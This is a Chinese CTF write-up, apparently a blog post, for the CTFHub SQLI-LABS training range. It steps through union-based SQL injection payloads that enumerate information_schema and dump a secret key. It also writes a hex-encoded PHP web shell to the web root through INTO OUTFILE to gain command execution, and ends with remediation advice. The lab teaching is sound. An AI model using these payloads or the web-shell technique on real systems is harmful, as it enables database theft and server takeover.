
---
layout: post
title: "CTFHub Writeup-综合训练 SQLI-LABS"
date: 2026-10-25
categories: CTF
tags: [CTFHub, Web, 技能树]
---

# CTFHub Writeup - 综合训练 SQLI-LABS 

## 题目类型

WEB

# CTFHub 综合训练 SQLI-LABS Writeup

## 0x01 题目信息

| 项目 | 内容 |
| --- | --- |
| 题目名称 | CTFHub 技能学习 - 综合训练 SQLI-LABS |
| 靶场地址 | `http://challenge-6ab1e28af23a8e0f.sandbox.ctfhub.com:10800` |
| 环境 | sqli-labs（Less-1 ~ Less-65），MariaDB 10.3.22，PHP 5.6.40 |
| 环境性质 | 训练靶场，**无 flag**（平台弹窗标注） |
| 训练目标 | 打通注入链，提取 `CHALLENGES` 库的 secret key |
| 随机表 / 字段 | `NRL83D1967` / `secret_OY5Z` |
| 提取结果 | `ON4W6QzIDXGpezllv8EF53Lr` |

## 0x02 题目说明

点开题目后，平台弹窗写得很清楚：

> 这个是训练靶场、无 flag

所以这道题不存在 `ctfhub{...}` 形式的 flag，提交框只是页面通用组件。它的定位是「综合训练」：把 SQL 注入的各个知识点在一个完整的 sqli-labs 环境里串起来练一遍。

真正有明确目标的是 Less-54，页面上写着：

> The objective of this challenge is to dump the (secret key) from only random table from Database ('CHALLENGES') in Less than 10 attempts.

也就是从 `CHALLENGES` 库里**随机表名、随机字段名**的表中取出 secret key。这正好把 union 注入、`information_schema` 查结构、随机表名处理这几个技能综合到了一起。

需要先说明：环境变量里的 `FLAG=not_flag` 是镜像自带的诱饵，`/flag` 也不存在，不要在这上面浪费时间。

## 0x03 解题过程

**3.1 找注入点**

从最简单的 Less-1 入手：

```
http://challenge-6ab1e28af23a8e0f.sandbox.ctfhub.com:10800/Less-1/?id=1
```

页面回显：

```
Your Login name:Dumb
Your Password:Dumb
```

加一个单引号：

```
Less-1/?id=1'
```

页面抛出语法错误：

```
You have an error in your SQL syntax; ... near ''1'' LIMIT 0,1' at line 1
```

说明 `id` 处是字符型注入，单引号可以用 `-- -` 注释掉后面的 `LIMIT 0,1`。

**3.2 判断列数**

```
Less-1/?id=1' order by 1-- -
Less-1/?id=1' order by 2-- -
Less-1/?id=1' order by 3-- -
Less-1/?id=1' order by 4-- -
```

前三个正常回显，第四个报错，说明原查询是 **3 列**。

**3.3 确认回显位**

```
Less-1/?id=-1' union select 1,2,3-- -
```

回显：

```
Your Login name:2
Your Password:3
```

第 2、3 列会显示在页面上，后续把要查的内容放在第 2 列即可。

**3.4 查数据库**

```
Less-1/?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata-- -
```

回显：

```
information_schema,mysql,performance_schema,security
```

`schema` 里还没有 `challenges`，说明挑战库尚未初始化。

**3.5 初始化 CHALLENGES 库**

访问题目自带的初始化脚本：

```
http://challenge-6ab1e28af23a8e0f.sandbox.ctfhub.com:10800/sql-connections/setup-db-challenge.php
```

页面输出：

```
[*]...................Creating New database successfully
[*]...................Creating New Table 'NRL83D1967' successfully
[*]...................Inserted data correctly  into table 'NRL83D1967'
```

这一步生成了随机表 `NRL83D1967`，并插入了随机的 secret key。

**3.6 查随机表与随机字段**

有了库名，查 `CHALLENGES` 下有哪些表：

```
Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='challenges'-- -
```

回显：

```
NRL83D1967
```

再查这张表的字段：

```
Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='challenges' and table_name='NRL83D1967'-- -
```

回显：

```
id,sessid,secret_OY5Z,tryy
```

字段名同样是随机的 `secret_OY5Z`。

**3.7 取 secret key**

把表和字段代进去：

```
Less-1/?id=-1' union select 1,secret_OY5Z,3 from challenges.NRL83D1967-- -
```

回显：

```
Your Login name:ON4W6QzIDXGpezllv8EF53Lr
```

拿到 secret key：

```
ON4W6QzIDXGpezllv8EF53Lr
```

**3.8 提交验证**

回到 Less-54，把 key 填进表单提交：

```
curl -X POST -d "key=ON4W6QzIDXGpezllv8EF53Lr&answer_key=Submit" \
  http://challenge-6ab1e28af23a8e0f.sandbox.ctfhub.com:10800/Less-54/
```

页面返回成功的图片（`Less-54-1.jpg`），而不是打脸的 `slap1.jpg`，说明 key 正确。

**3.9 进阶：INTO OUTFILE 写马**

Less-7 的考点是 `INTO OUTFILE`，这里同样可以用。先把查询结果写进 Web 目录：

```
Less-1/?id=-1' union select 1,0x3c3f7068702073797374656d28245f4745545b2263225d293b203f3e,3 into outfile '/var/www/html/zz.php'-- -
```

其中 `0x3c3f...` 是 `<?php system($_GET["c"]); ?>` 的十六进制。

访问 `/zz.php?c=id`，能看到 `uid=33(www-data)`，说明已经拿到命令执行。

这也可以用来读取服务器上的文件，是综合训练里「注入 → 写文件 → 命令执行」的完整链条。

## 0x04 完整流程

| 步骤 | 语句 | 结果 |
| --- | --- | --- |
| 找注入点 | `id=1'` | 语法错误 |
| 判断列数 | `order by 3` | 3 列 |
| 回显位 | `-1' union select 1,2,3-- -` | 2、3 |
| 查库 | `information_schema.schemata` | `security` 等 |
| 初始化 | `setup-db-challenge.php` | 生成 `NRL83D1967` |
| 查表 | `information_schema.tables` | `NRL83D1967` |
| 查字段 | `information_schema.columns` | `secret_OY5Z` |
| 取数据 | `select secret_OY5Z from challenges.NRL83D1967` | `ON4W6QzIDXGpezllv8EF53Lr` |

整条链路可以概括为：**union 占位 → information_schema 查结构 → 按随机表名/字段名取数据 → 提交 secret key。**

## 0x05 训练建议

这个靶场有 65 关，建议按下面的顺序练，和本题的链路对应：

| 关卡 | 考点 | 说明 |
| --- | --- | --- |
| Less-1 ~ 4 | union 注入 | 字符型、数字型、单双引号、括号闭合 |
| Less-5 ~ 6 | 双注入 | 报错、`extractvalue` 等 |
| Less-7 | INTO OUTFILE | 写文件到 Web 目录 |
| Less-8 | 布尔盲注 | 用页面差异判断真假 |
| Less-9 ~ 10 | 时间盲注 | `sleep()` 判断 |
| Less-11 ~ 12 | POST 注入 | 表单参数 |
| Less-54 ~ 61 | 挑战模式 | 随机表名 / 字段名 |

本题走的是 Less-1（union）+ Less-54（挑战模式）的组合，前者负责拿到回显位和查结构的能力，后者负责处理随机表名和随机字段名。

## 0x06 踩坑记录

1. **这题没有 flag**：平台明确标注「训练靶场、无 flag」，环境变量 `FLAG=not_flag` 也是诱饵，不要按常规 CTF 题去找 `ctfhub{}`。

2. **表名和字段名都是随机的**：`NRL83D1967`、`secret_OY5Z` 每次重置都会变，照抄别人的 payload 一定失败，必须自己查 `information_schema`。

3. **`challenges` 库一开始不存在**：直接查会返回空，要先访问 `setup-db-challenge.php` 初始化，或者点 index 页面的「Setup/reset Database」。

4. **初始化会清空并重建**：每执行一次，表名、字段名、secret key 全部重新生成，之前拿到的 key 立即失效。

5. **`order by` 要用 `-- -` 注释**：Less-1 的 SQL 末尾有 `LIMIT 0,1`，不注释掉会破坏语法。

6. **union 前半段要置空**：`-1'` 让原查询查不到数据，页面才会显示 union 的结果。

7. **提交 key 有次数限制**：Less-54 只允许 10 次尝试，超过会自动重置挑战，所以不要用页面上的输入框反复试，先在数据库里确认。

## 0x07 修复建议

1. **使用预编译（参数化查询）**：`PDO` 的 `prepare/execute` 或 `mysqli` 预处理，把 `id` 作为参数绑定，注入从根上消失。

2. **对输入做类型校验**：`id` 应该是整数，用 `intval()` 强转或正则限制为纯数字。

3. **关闭详细报错**：`display_errors=Off`，错误只写日志；不要把 SQL 语句回显到页面。

4. **最小权限**：Web 应用不要用 root 连库，只授予业务所需的 `SELECT` 权限。

5. **禁用危险函数与写文件**：设置 `secure_file_priv` 限制文件读写，关闭 `INTO OUTFILE` 能力。

6. **生产环境不要部署靶场**：sqli-labs 本身就是教学环境，不应出现在公网。

## 0x08 总结

综合训练没有新技巧，考的是把前面学过的内容串起来：

- 用 `order by` 定列数、`union select` 占回显位；

- 用 `information_schema` 摸清库表结构；

- 面对随机表名、随机字段名，依然能按「库 → 表 → 字段 → 数据」拿到目标。

本题最终取到的是 `CHALLENGES` 库里的 secret key `ON4W6QzIDXGpezllv8EF53Lr`。由于这是训练靶场、没有 flag，这篇记录的重点不是「拿到一个字符串」，而是把从注入到取数的完整思路走通一遍。

---
